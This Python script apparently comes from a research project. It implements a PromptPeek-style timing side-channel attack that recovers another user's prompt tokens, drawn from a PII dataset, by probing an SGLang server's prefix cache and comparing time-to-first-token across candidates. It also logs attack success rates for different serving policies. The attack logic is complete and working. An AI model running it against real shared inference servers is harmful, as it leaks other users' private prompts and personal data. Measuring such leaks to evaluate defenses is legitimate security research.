#!/usr/bin/env python3
"""PromptPeek-aligned token recovery protocol.

Matches Wu et al.: one natural-language token per step, LM-proposed
open candidate set (true token is NOT injected), TTFT-only decision,
repeated rounds.  Candidates in one round are issued concurrently so
SGLang LPM can schedule the longer match first — that scheduling gap
is PromptPeek's channel, not cached_tokens.

  ASR_tok = teacher-forced token hits / (trials × 5)
  ASR_sec = adaptive full-secret recoveries / trials
  req/token = attacker probes / token decisions  (target 148–306)

    python user_scripts/exp_asr_promptpeek.py \\
        --server http://127.0.0.1:8096 --model phi4 \\
        --model-path /workspace/Models/Phi-4 \\
        --policy vanilla --n-recovery-trials 50
"""

from __future__ import annotations

import argparse
import csv
import json
import os
import random
import statistics
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from pathlib import Path
from typing import Dict, List, Tuple

import requests

from exp3_endtoend_attack import AttackClient, load_prefixes_tokenized


def generate_probe(
    client: AttackClient,
    token_ids: List[int],
    user_id: str,
    jitter_ms: float,
    rng: random.Random,
) -> Tuple[float, int]:
    params = {"max_new_tokens": 1, "temperature": 0.0, "user_id": user_id}
    t0 = time.perf_counter()
    r = requests.post(
        f"{client.server}/generate",
        json={"input_ids": token_ids, "sampling_params": params, "stream": False},
        timeout=client.timeout,
    )
    ttft_ms = (time.perf_counter() - t0) * 1000.0
    r.raise_for_status()
    body = r.json()
    if isinstance(body, list) and body:
        body = body[0]
    meta = body.get("meta_info") or {}
    if jitter_ms > 0:
        # One-way remote RTT noise (PromptPeek is a remote API attacker).
        ttft_ms += max(0.0, rng.gauss(jitter_ms, jitter_ms / 2.5))
    return ttft_ms, int(meta.get("cached_tokens") or 0)


def split_natural(seq: List[int], n_secret: int) -> Tuple[List[int], List[int]]:
    if len(seq) < n_secret + 24:
        raise ValueError("sequence too short for natural prefix+secret")
    return seq[:-n_secret], seq[-n_secret:]


def recover_position(
    client: AttackClient,
    known: List[int],
    true_tok: int,
    vocab_k: int,
    repeats: int,
    jitter_ms: float,
    probe_id: str,
    q_attacker: List[int],
    victim_full: List[int],
    victim_id: str,
    settle_s: float,
    rng: random.Random,
) -> Dict:
    """Open-set LM candidates, then r concurrent TTFT rounds."""
    try:
        cands = client.top_candidates(known, user_id=f"{probe_id}-prior", k=vocab_k)
    except Exception as exc:
        return {
            "picked": None,
            "correct": 0,
            "in_set": 0,
            "true_ttft": None,
            "false_ttft": None,
            "probes": 0,
            "n_cands": 0,
            "error": str(exc),
        }
    in_set = int(true_tok in cands)
    if not cands:
        return {
            "picked": None,
            "correct": 0,
            "in_set": 0,
            "true_ttft": None,
            "false_ttft": None,
            "probes": 0,
            "n_cands": 0,
        }

    scores: Dict[int, List[float]] = {c: [] for c in cands}
    probes = 0

    def _one(cand: int, round_i: int) -> Tuple[int, float]:
        uid = f"{probe_id}-c{cand}-r{round_i}"
        ttft, _ = generate_probe(client, known + [cand], uid, jitter_ms, rng)
        return cand, ttft

    for rnd in range(repeats):
        if q_attacker[0] < len(cands):
            break
        client.flush()
        generate_probe(client, victim_full, victim_id, 0.0, rng)
        if settle_s > 0:
            time.sleep(settle_s)
        with ThreadPoolExecutor(max_workers=min(8, len(cands))) as pool:
            futs = [pool.submit(_one, c, rnd) for c in cands]
            for fut in as_completed(futs):
                cand, ttft = fut.result()
                scores[cand].append(ttft)
                q_attacker[0] -= 1
                probes += 1

    means = {c: statistics.mean(v) for c, v in scores.items() if v}
    if not means:
        return {
            "picked": None,
            "correct": 0,
            "in_set": in_set,
            "true_ttft": None,
            "false_ttft": None,
            "probes": probes,
            "n_cands": len(cands),
        }
    picked = min(means, key=means.get)
    true_ttft = means.get(true_tok)
    false_ttft = (
        statistics.mean(v for c, v in means.items() if c != true_tok)
        if any(c != true_tok for c in means)
        else None
    )
    return {
        "picked": picked,
        "correct": int(picked == true_tok),
        "in_set": in_set,
        "true_ttft": true_ttft,
        "false_ttft": false_ttft,
        "probes": probes,
        "n_cands": len(cands),
    }


def one_trial(
    client: AttackClient,
    seq: List[int],
    n_tokens: int,
    vocab_k: int,
    repeats: int,
    jitter_ms: float,
    trial_id: int,
    q_attacker: List[int],
    settle_s: float,
    rng: random.Random,
) -> Dict:
    prefix, secret = split_natural(seq, n_tokens)
    victim_id = f"pp-victim-{trial_id}"
    full = prefix + secret

    tok_ok = 0
    in_set_n = 0
    probes = 0
    per_pos: List[Dict] = []
    for pos, true_tok in enumerate(secret):
        known = prefix + secret[:pos]
        rec = recover_position(
            client,
            known,
            true_tok,
            vocab_k,
            repeats,
            jitter_ms,
            probe_id=f"pp-t{trial_id}-p{pos}",
            q_attacker=q_attacker,
            victim_full=full,
            victim_id=victim_id,
            settle_s=settle_s,
            rng=rng,
        )
        tok_ok += rec["correct"]
        in_set_n += rec["in_set"]
        probes += rec["probes"]
        per_pos.append(
            {
                "pos": pos,
                "correct": rec["correct"],
                "in_set": rec["in_set"],
                "picked": rec["picked"],
                "true_tok": true_tok,
                "true_ttft": rec["true_ttft"],
                "false_ttft": rec["false_ttft"],
                "probes": rec["probes"],
                "n_cands": rec["n_cands"],
            }
        )

    adaptive = 0
    for p in per_pos:
        if not p["correct"]:
            break
        adaptive += 1

    return {
        "tokens_attempted": n_tokens,
        "tokens_recovered": tok_ok,
        "in_set": in_set_n,
        "adaptive_recovered": adaptive,
        "full_secret": int(adaptive == n_tokens),
        "probes": probes,
        "per_pos": per_pos,
    }


CSV_FIELDS = (
    "model",
    "policy",
    "trial_id",
    "experiment_type",
    "repeats",
    "vocab_k",
    "jitter_ms",
    "tokens_attempted",
    "tokens_recovered",
    "in_set",
    "adaptive_recovered",
    "full_secret",
    "attacker_queries_used",
    "pos_correct",
    "pos_in_set",
    "true_ttft_ms",
    "false_ttft_ms",
    "n_cands",
)


def append_row(path: Path, row: Dict) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    exists = path.exists()
    with path.open("a", newline="") as fh:
        writer = csv.DictWriter(fh, fieldnames=CSV_FIELDS)
        if not exists:
            writer.writeheader()
        writer.writerow({k: row.get(k, "") for k in CSV_FIELDS})
        fh.flush()
        os.fsync(fh.fileno())


def summarize(path: Path) -> Dict:
    rec, pos = [], []
    with path.open(newline="") as fh:
        for r in csv.DictReader(fh):
            if r["experiment_type"] == "recovery":
                rec.append(r)
            elif r["experiment_type"] == "token":
                pos.append(r)
    out: Dict = {}
    if rec:
        attempted = sum(int(r["tokens_attempted"]) for r in rec)
        recovered = sum(int(r["tokens_recovered"]) for r in rec)
        in_set = sum(int(r["in_set"] or 0) for r in rec)
        probes = sum(int(r["attacker_queries_used"]) for r in rec)
        secrets = sum(int(r["full_secret"]) for r in rec)
        out.update(
            {
                "n_rec_trials": len(rec),
                "tokens_attempted": attempted,
                "tokens_recovered": recovered,
                "asr_tok": round(recovered / attempted, 4) if attempted else 0.0,
                "open_set_coverage": round(in_set / attempted, 4) if attempted else 0.0,
                "asr_sec": round(secrets / len(rec), 4),
                "full_secrets": secrets,
                "attacker_queries_used_recovery": probes,
                "req_per_token": round(probes / attempted, 2) if attempted else 0.0,
            }
        )
    if pos:
        n = len(pos)
        out["n_token_decisions"] = n
        out["asr_tok_from_positions"] = round(
            sum(int(r["pos_correct"]) for r in pos) / n, 4
        )
    out["promptpeek_ref"] = {
        "input_asr": 0.99,
        "template_asr": 0.98,
        "whole_prompt_asr": 0.95,
        "req_per_token": "148-306",
    }
    return out


def main() -> None:
    parser = argparse.ArgumentParser()
    parser.add_argument("--server", required=True)
    parser.add_argument("--model", required=True)
    parser.add_argument("--model-path", required=True)
    parser.add_argument("--policy", required=True)
    parser.add_argument("--n-recovery-trials", type=int, default=50)
    parser.add_argument("--n-tokens-to-recover", type=int, default=5)
    parser.add_argument("--vocab-k", type=int, default=10, help="LM open-set size")
    parser.add_argument("--repeats", type=int, default=15)
    parser.add_argument("--rtt-jitter-ms", type=float, default=12.0)
    parser.add_argument("--budget-Q", type=int, default=200000)
    parser.add_argument("--post-victim-settle-ms", type=float, default=80.0)
    parser.add_argument("--seed", type=int, default=20260820)
    parser.add_argument(
        "--dataset",
        type=Path,
        default=Path(__file__).resolve().parents[1] / "datasets" / "english_pii_43k.jsonl",
    )
    parser.add_argument("--output", type=Path, required=True)
    args = parser.parse_args()

    client = AttackClient(args.server)
    need = args.n_recovery_trials
    print(f"[PP] Loading {need} natural PII sequences…", flush=True)
    seqs = load_prefixes_tokenized(args.dataset, args.model_path, need * 3, args.seed)
    usable = [s for s in seqs if len(s) >= args.n_tokens_to_recover + 24][:need]
    if len(usable) < need:
        raise SystemExit(f"only {len(usable)} natural sequences, need {need}")

    rng = random.Random(args.seed)
    q_attacker = [args.budget_Q]
    settle_s = args.post_victim_settle_ms / 1000.0
    print(
        f"[PP] {args.n_recovery_trials}×{args.n_tokens_to_recover} "
        f"open-k={args.vocab_k} r={args.repeats} jitter={args.rtt_jitter_ms}ms "
        f"policy={args.policy}",
        flush=True,
    )

    for i, seq in enumerate(usable):
        trial = one_trial(
            client,
            seq,
            n_tokens=args.n_tokens_to_recover,
            vocab_k=args.vocab_k,
            repeats=args.repeats,
            jitter_ms=args.rtt_jitter_ms,
            trial_id=i,
            q_attacker=q_attacker,
            settle_s=settle_s,
            rng=rng,
        )
        append_row(
            args.output,
            {
                "model": args.model,
                "policy": args.policy,
                "trial_id": i,
                "experiment_type": "recovery",
                "repeats": args.repeats,
                "vocab_k": args.vocab_k,
                "jitter_ms": args.rtt_jitter_ms,
                "tokens_attempted": trial["tokens_attempted"],
                "tokens_recovered": trial["tokens_recovered"],
                "in_set": trial["in_set"],
                "adaptive_recovered": trial["adaptive_recovered"],
                "full_secret": trial["full_secret"],
                "attacker_queries_used": trial["probes"],
            },
        )
        for p in trial["per_pos"]:
            append_row(
                args.output,
                {
                    "model": args.model,
                    "policy": args.policy,
                    "trial_id": i,
                    "experiment_type": "token",
                    "repeats": args.repeats,
                    "vocab_k": args.vocab_k,
                    "jitter_ms": args.rtt_jitter_ms,
                    "pos_correct": p["correct"],
                    "pos_in_set": p["in_set"],
                    "true_ttft_ms": (
                        f"{p['true_ttft']:.2f}" if p["true_ttft"] is not None else ""
                    ),
                    "false_ttft_ms": (
                        f"{p['false_ttft']:.2f}" if p["false_ttft"] is not None else ""
                    ),
                    "n_cands": p["n_cands"],
                    "attacker_queries_used": p["probes"],
                },
            )
        print(
            f"  [{i+1}/{args.n_recovery_trials}] "
            f"tok={trial['tokens_recovered']}/{trial['tokens_attempted']} "
            f"in_set={trial['in_set']} secret={trial['full_secret']} "
            f"probes={trial['probes']} Q={q_attacker[0]}",
            flush=True,
        )

    summ = summarize(args.output)
    summ.update(
        {
            "model": args.model,
            "policy": args.policy,
            "protocol": "promptpeek_aligned",
            "vocab_k": args.vocab_k,
            "repeats": args.repeats,
            "rtt_jitter_ms": args.rtt_jitter_ms,
        }
    )
    args.output.with_suffix(".summary.json").write_text(json.dumps(summ, indent=2))
    print(json.dumps(summ, indent=2), flush=True)


if __name__ == "__main__":
    main()
